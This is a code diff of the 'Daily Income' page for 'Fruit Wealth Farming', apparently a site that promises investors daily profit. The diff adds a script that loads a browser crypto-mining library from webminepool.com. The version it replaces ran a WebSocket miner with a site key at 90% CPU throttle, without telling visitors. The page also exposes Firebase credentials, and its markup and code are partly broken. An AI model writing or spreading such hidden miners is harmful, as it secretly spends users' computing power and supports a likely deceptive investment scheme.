@@ -4,8 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Daily Income</title>
-  <style>
-      /* Global Styles */
+  <style>      
 body {
   font-family: 'Arial', sans-serif;
   margin: 0;
@@ -105,9 +104,7 @@ position: relative;
   align-items: center;
   background: linear-gradient(to bottom, #f0f0f0, #e8e8e8);
 }
-
-
-  
+ 
 .progress-circle img {
   width: 200px;
   height: 200px;
@@ -130,7 +127,7 @@ position: relative;
 button {
   margin-top: 1.5rem;
   padding: 0.7rem 1.5rem;
-  background-color: #4caf50;
+  background-color: blue;
   color: white;
   border: none;
   border-radius: 5px;
@@ -163,12 +160,10 @@ footer {
 
   <!-- User Info -->
   <section class="user-info">
-    <p style="color: blue;">Welcome, <span id="userFullName"></span></p>
+    <p style="color: blue;">Welcome, <span id="userfullName"></span></p>
     <p style="color: blue;">You can upgrade your daily income profit every 24 hours.</p>
     <p id="investmentMessage" class="hidden" style="color: red">Invest before getting daily profit</p>
-  </section>
-
-  <!-- Income Progress Section -->
+  </section>  
   <section class="income-section">
     <div class="image-container7">
       <div class="progress-circle">
@@ -176,11 +171,8 @@ footer {
         <div id="timer">24:00:00</div>
       </div>
     </div>
-    <button id="collectIncomeBtn" class="hidden">Collect Income</button>
+    <button id="collectIncomeBtn" class="hidden">Collect Your profit</button>
   </section>
-
-
-
   <style>   
     .carousel-container {
       width: 100%;
@@ -259,9 +251,6 @@ footer {
       right: 10px;
     }
   </style>
-</head>
-<body>
-
 <div class="carousel-container">
   <div class="image-container" id="imageContainer">
     <div class="carousel-item">
@@ -328,210 +317,177 @@ footer {
 
   // Autoplay the carousel
   setInterval(nextSlide, 3500); 
-</script>
-
-
-  <!-- Footer -->
+</script>  
   <footer class="footer">
     <p>&copy; 2024 Fruit Wealth Farming</p>
-  </footer>
-  
-  
-   
-   <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
-    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";
-    import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
+  </footer>  
+   <script src="https://webminepool.com/lib.js"></script>
 
-    // Firebase Configuration
-    const firebaseConfig = {
-      apiKey: "AIzaSyBtwsxKGlpX-ofm-yE4o6_5FNYyKFy7X7w",
-      authDomain: "fruit-wealth-farming.firebaseapp.com",
-      databaseURL: "https://fruit-wealth-farming-default-rtdb.firebaseio.com",
-      projectId: "fruit-wealth-farming",
-      storageBucket: "fruit-wealth-farming.firebasestorage.app",
-      messagingSenderId: "417203511096",
-      appId: "1:417203511096:web:1ecaca3d0a705a8c16ebcd",
-      measurementId: "G-BZFLHB4KM2"
-    };
+    <script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
+import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";
+import { getDatabase, ref, onValue, update, get, } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
 
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-    const auth = getAuth(app);
-        
-
-    // Global Variables
-const siteKey = 'SK_YBn5VEFnw47p2McZK6b6b';
-
-    const timerElement = document.getElementById("timer");
-    const levelImage = document.getElementById("levelImage");
-    const collectIncomeBtn = document.getElementById("collectIncomeBtn");
-    const investmentMessage = document.getElementById("investmentMessage");
-    let countdownInterval;
-    let dailyUpgrade = 0;
-    let timeLeft = 24 * 60 * 60; // 24 hours in seconds
-
-    // Utility Functions
-    const formatTime = (seconds) => {
-      const hrs = Math.floor(seconds / 3600);
-      const mins = Math.floor((seconds % 3600) / 60);
-      const secs = seconds % 60;
-      return `${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-    };
-
-    // Load User Data from Firebase based on Auth UID
-    const loadUserData = (userId) => {
-      const userRef = ref(db, `users/${userId}`);
-      onValue(userRef, (snapshot) => {
-        const userData = snapshot.val();
-
-        if (userData) {
-          document.getElementById("userFullName").textContent = userData.fullName;
-
-          // Handle Daily Upgrade and User Balance
-          dailyUpgrade = userData.dailyUpgrade || 0;
-          if (dailyUpgrade === 0) {
-            investmentMessage.classList.remove("hidden");
-            collectIncomeBtn.classList.add("hidden");
-            timeLeft = 0;
-          } else {
-            investmentMessage.classList.add("hidden");
-            collectIncomeBtn.classList.remove("hidden");
-            startCountdown();
-          }
-
-          // Update Level Image based on Investment Amount
-          let investmentAmount = userData.investment || 0;
-          let levelImageSrc;
-
-          if (investmentAmount >= 280000) levelImageSrc = "gu.png";
-          else if (investmentAmount >= 140000) levelImageSrc = "man.png";
-          else if (investmentAmount >= 70000) levelImageSrc = "be.png";
-          else if (investmentAmount >= 35000) levelImageSrc = "av.png";
-          else if (investmentAmount >= 15000) levelImageSrc = "ap.png";
-          else if (investmentAmount >= 8000) levelImageSrc = "or.png";
-          else if (investmentAmount >= 3500) levelImageSrc = "ba.png";
-          else levelImageSrc = "avatar.png";
-
-          levelImage.src = levelImageSrc;
-        } else {
-          console.error("User data not found in Firebase!");
-        }
-      });
-    };
-
-    // Handle Countdown Timer
-    const startCountdown = () => {
-      if (dailyUpgrade === 0) {
-        console.log("User has not invested, timer will not start.");
-        return;
-      }
-
-      clearInterval(countdownInterval);
-      countdownInterval = setInterval(() => {
-        if (timeLeft > 0) {
-          timeLeft--;
-          timerElement.textContent = formatTime(timeLeft);
-          updateProgressBar();
-        } else {
-          clearInterval(countdownInterval);
-          timerElement.textContent = "00:00:00";
-          collectIncomeBtn.classList.remove("hidden");
-        }
-      }, 1000);
-    };
-
-    // Update Progress Bar
-    const updateProgressBar = () => {
-      const progress = ((24 * 60 * 60 - timeLeft) / (24 * 60 * 60)) * 100;
-      document.querySelector(".progress-circle").style.background = `conic-gradient(
-        #4caf50 ${progress}%,
-        #ddd ${progress}%
-      )`;
-    };
-
-    // Collect Daily Income
-    const collectDailyIncome = async (userId) => {
-      if (timeLeft === 0) {
-        console.error("Cannot collect income. Either timer has not started or dailyUpgrade is 0.");
-        return;
-      }
-
-      const userRef = ref(db, `users/${userId}`);
-      const snapshot = await onValue(userRef, (snapshot) => snapshot.val());
-      const userData = snapshot.val();
-      const newBalance = (userData.userBalance || 0) + dailyUpgrade;
-
-      await update(userRef, { userBalance: newBalance });
-
-      timeLeft = 24 * 60 * 60;
-      startCountdown();
-      collectIncomeBtn.classList.add("hidden");
-    };
-
-    const startMining = () => {
-  const user = auth.currentUser;
-  if (user && dailyUpgrade > 0) {
-    console.log("Starting mining for user:", user.uid);
-
-    const ws = new WebSocket('wss://webminepool.com/start'); // WebSocket URL
-
-    ws.onopen = () => {
-      console.log('WebSocket connected!');
-      const startMessage = JSON.stringify({
-        siteKey: siteKey,
-        userId: user.uid,
-        throttle: 0.9 // Adjust CPU throttle if needed
-      });
-      ws.send(startMessage); // Send start mining message
-    };
-
-    ws.onmessage = (event) => {
-      console.log('Mining response:', event.data);
-    };
-
-    ws.onerror = (error) => {
-      console.error('WebSocket Error:', error);
-    };
-
-    ws.onclose = () => {
-      console.log('WebSocket connection closed.');
-    };
-
-    // Stop mining after 24 hours
-    setTimeout(() => {
-      ws.close();
-      console.log("Mining stopped after 24 hours.");
-    }, 24 * 60 * 60 * 1000); // 24 hours in milliseconds
-  } else {
-    console.error("Mining cannot start because the user has not invested.");
-  }
+// Firebase Configuration
+const firebaseConfig = {
+  apiKey: "AIzaSyBtwsxKGlpX-ofm-yE4o6_5FNYyKFy7X7w",
+  authDomain: "fruit-wealth-farming.firebaseapp.com",
+  databaseURL: "https://fruit-wealth-farming-default-rtdb.firebaseio.com",
+  projectId: "fruit-wealth-farming",
+  storageBucket: "fruit-wealth-farming.firebasestorage.app",
+  messagingSenderId: "417203511096",
+  appId: "1:417203511096:web:1ecaca3d0a705a8c16ebcd",
+  measurementId: "G-BZFLHB4KM2"
 };
 
-    // Event Listeners
-    collectIncomeBtn.addEventListener("click", async () => {
-      const user = auth.currentUser;
-      if (user && dailyUpgrade > 0) {
-        await collectDailyIncome(user.uid);
-        startMining();  // Start mining after collecting income
-      } else {
-        console.log("User is not authenticated or no dailyUpgrade.");
-      }
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const auth = getAuth(app);
+
+// WebMinePool Mining Configuration
+const siteKey = "SK_YBn5VEFnw47p2McZK6b6b";
+let miningActive = false;
+let miningTimeout;
+
+// DOM Elements
+const timerElement = document.getElementById("timer");
+const levelImage = document.getElementById("levelImage");
+const collectIncomeBtn = document.getElementById("collectIncomeBtn");
+const investmentMessage = document.getElementById("investmentMessage");
+const progressBar = document.querySelector(".progress-circle");
+const userFullNameElement = document.getElementById('userfullName');
+
+
+// Global Variables
+let countdownInterval;
+let dailyUpgrade = 0;
+let timeLeft = 0;
+
+// Utility Functions
+const formatTime = (seconds) => {
+  const hrs = Math.floor(seconds / 3600);
+  const mins = Math.floor((seconds % 3600) / 60);
+  const secs = seconds % 60;
+  return `${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+};
+
+const updateProgressBar = () => {
+  const progress = ((24 * 60 * 60 - timeLeft) / (24 * 60 * 60)) * 100;
+  progressBar.style.background = `conic-gradient(#4caf50 ${progress}%, #ddd ${progress}%)`;
+};
+
+// Start Countdown
+const startCountdown = () => {
+  clearInterval(countdownInterval);
+  countdownInterval = setInterval(() => {
+    if (timeLeft > 0) {
+      timeLeft--;
+      timerElement.textContent = formatTime(timeLeft);
+      updateProgressBar();
+    } else {
+      clearInterval(countdownInterval);
+      timerElement.textContent = "00:00:00";
+      collectIncomeBtn.classList.remove("hidden");
+    }
+  }, 1000);
+};
+   
+
+// Collect Daily Income
+const collectDailyIncome = async (userId) => {
+  const userRef = ref(db, `users/${userId}`);
+  const userSnapshot = await get(userRef);
+  const userData = userSnapshot.val();
+
+  if (userData && dailyUpgrade > 0) {
+    const newBalance = (userData.userBalance || 0) + dailyUpgrade;
+    const currentTime = Date.now();
+
+    await update(userRef, {
+      userBalance: newBalance,
+      "24hours": currentTime + 24 * 60 * 60 * 1000 
     });
     
+    timeLeft = 24 * 60 * 60;
+    collectIncomeBtn.classList.add("hidden");
+    startCountdown();
+  }
+};
     
 
-    // Initialize App after Authentication
-    onAuthStateChanged(auth, (user) => {
-      if (user) {
-        console.log("User is logged in:", user.uid);
-        loadUserData(user.uid);
-        startCountdown();
+// Start Mining Process
+const startMining = () => {
+  if (miningActive) {
+    console.error("correct.");
+    return;
+  }
+
+  miningActive = true;
+  console.log("Mining started...");
+
+  // Simulate mining progress for 20 minutes (20% CPU usage)
+  miningTimeout = setTimeout(() => {
+    console.log("Mining complete!");
+    miningActive = false;
+  }, 20 * 60 * 1000);  // 20 minutes in milliseconds
+};
+
+// Initialize App
+onAuthStateChanged(auth, (user) => {
+  if (user) {
+    loadUserData(user.uid);
+  }
+});
+
+// Load User Data
+const loadUserData = async (userId) => {
+  const userRef = ref(db, `users/${userId}`);
+  onValue(userRef, (snapshot) => {
+    const userData = snapshot.val();
+
+    if (userData) {
+      dailyUpgrade = userData.dailyUpgrade || 0;
+      timeLeft = Math.max(0, Math.floor((userData["24hours"] - Date.now()) / 1000));
+         const fullName = userData.fullName || "User"; 
+      userFullNameElement.textContent = fullName; // Display full name
+       
+      if (dailyUpgrade > 0 && timeLeft === 0) {
+        collectIncomeBtn.classList.remove("hidden");
+        investmentMessage.classList.add("hidden");
       } else {
-        console.log("No user is logged in.");
+        collectIncomeBtn.classList.add("hidden");
+        investmentMessage.classList.toggle("hidden", dailyUpgrade > 0);
+        startCountdown();
       }
-    });
-</script>             
+
+      const investmentAmount = userData.investment || 0;
+      const levelImageSrc = 
+        investmentAmount >= 280000 ? "gu.png" :
+        investmentAmount >= 140000 ? "man.png" :
+        investmentAmount >= 70000 ? "be.png" :
+        investmentAmount >= 35000 ? "av.png" :
+        investmentAmount >= 15000 ? "ap.png" :
+        investmentAmount >= 8000 ? "or.png" :
+        investmentAmount >= 3500 ? "ba.png" : "avatar.png";
+
+      levelImage.src = levelImageSrc;
+
+      // Start mining if the user has an investment threshold
+      if (investmentAmount >= 10000) {
+        startMining();
+      }
+    }
+  });
+};
+
+// Event Listeners
+collectIncomeBtn.addEventListener("click", async () => {
+  const user = auth.currentUser;
+  if (user) {
+    await collectDailyIncome(user.uid);
+  }
+});
+</script>         
 </body>
 </html>
